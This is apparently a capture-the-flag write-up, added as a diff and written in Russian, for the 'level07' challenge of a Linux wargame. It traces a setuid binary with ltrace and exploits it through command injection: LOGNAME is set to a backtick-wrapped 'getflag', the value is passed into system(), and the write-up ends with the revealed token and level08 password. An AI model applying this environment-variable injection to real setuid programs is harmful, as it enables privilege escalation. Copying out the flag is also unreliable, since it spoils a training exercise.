@@ -1,0 +1,33 @@
+level07
+
+ls
+В папке бинарник ./level07
+
+Прогоняем через ltrace:
+ltrace ./level07
+    __libc_start_main(0x8048514, 1, 0xbffff7c4, 0x80485b0, 0x8048620 <unfinished ...>
+    getegid()                                                                               = 2007
+    geteuid()                                                                               = 2007
+    setresgid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)                                     = 0
+    setresuid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)                                     = 0
+    getenv("LOGNAME")                                                                       = "getflag"
+    asprintf(0xbffff714, 0x8048688, 0xbfffff4f, 0xb7e5ee55, 0xb7fed280)                     = 20
+    system("/bin/echo getflag "Check flag.Here is your token : Nope there is no token here for you sorry. Try again :slight_smile:
+    <unfinished ...>
+    --- SIGCHLD (Child exited) ---
+    <... system resumed> )                                                                  = 0
+    +++ exited (status 0) +++
+
+Видим, что в строке: getenv("LOGNAME") = "getflag"
+данные берутся из переменной среды LOGNAME и используются в системном вызове system()
+
+Следовательно нужно подменим переменную LOGNAME на getflag:
+export LOGNAME='`getflag`'
+
+./level07
+Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
+
+su level08
+fiumuikeil55xe9cu4dood66h
+
+Done!
